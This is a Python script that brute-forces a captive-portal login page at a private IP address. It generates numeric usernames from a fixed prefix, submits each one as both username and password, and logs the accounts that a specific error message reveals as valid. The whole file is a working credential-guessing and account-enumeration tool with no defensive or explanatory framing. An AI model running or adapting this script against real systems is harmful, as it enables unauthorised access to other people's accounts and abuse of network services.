import requests, threading, time, random
reqs = requests.session()
url = "http://172.16.0.1/portal/user-authen.php"
header = {
    "content-type":"application/x-www-form-urlencoded",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
}
def getRun():
    df = open('username_v2.txt', 'r', encoding='utf-8')
    return df.read()
def setRun(x):
    df = open('username_v2.txt', 'w',encoding='utf-8')
    df.writelines(str(x))
    df.close()
def result(x):
    df = open('username.txt', 'w',encoding='utf-8')
    df.writelines(str(x))
    df.close()
def BrutforcePassword(username_main,length):
    for i in range(10**(length-len(username_main))):
        if getRun()=='0': return
        isLength = True
        username = username_main+str(i)
        while isLength:
            if getRun()=='0': return
            if(len(username)==length):
                isLength = False
                # print(username)
            else:
                username = str(username)+"0"
        body = {
            "txtLogin":username,
            "txtPasswd":username,
            "btnLogin":"Login",
            "reqUrl":"",
            "reqCheck":"false"
        }
        try:
            res = reqs.post(url=url,headers=header,data=body)
            if "Loginname or Password is invalid! (2)" in res.text:
                print(f"Login is {username}")
                result(f'usename : {username}')
                # setRun("0")
        except:pass
setRun("1")
BrutforcePassword("1510",6)

